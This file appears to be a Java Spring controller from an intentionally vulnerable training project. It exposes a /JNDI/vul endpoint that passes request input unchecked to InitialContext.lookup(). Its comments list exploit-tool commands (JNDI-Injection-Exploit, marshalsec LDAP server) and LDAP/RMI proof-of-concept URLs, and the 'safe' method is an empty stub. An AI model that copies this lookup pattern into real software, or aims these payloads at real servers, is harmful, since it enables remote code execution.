package com.madaha.codesecone.controller.jndi;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.naming.Context;
import javax.naming.InitialContext;

@RestController
@RequestMapping("/JNDI")
public class JNDIInject {
    Logger log = LoggerFactory.getLogger(JNDIInject.class);

    /**
     * lookup 方法会将传入的参数当做 JNDI 名称，如果参数值包含恶意的 JNDI 名称，那么攻击者就可以通过这种方式来执行任意的 JNDI 操作。
     * lookup：通过名字检索执行的对象，当lookup()方法的参数可控时，攻击者便能够提供一个恶意的url地址来加载恶意类。
     *
     * @payload-1 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open -a Calculator" -A 127.0.0.1
     * @payload-2 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:65500/\#Exploit
     *
     * @poc-ldap http://127.0.0.1:28888/JNDI/vul?content=ldap://127.0.0.1:1389/Object
     * @poc-rmi http://127.0.0.1:28888/JNDI/vul?content=rmi://127.0.0.1:1099/Object
     *
     * 注意：默认注册时配置，ldap 1389端口，rmi 1099端口；
     *
     * @param content
     * @return
     */
    @GetMapping("/vul")
    public String vul(String content){
        log.info("[vul] JNDI注入：" + content);

        try{
            Context ctx = new InitialContext();
            ctx.lookup(content);
        }catch (Exception e){
            log.warn("JNDI错误消息！");
            e.printStackTrace();
        }
        return "JNDI注入";
    }

    public String safe(String content){

        return "";
    }

}
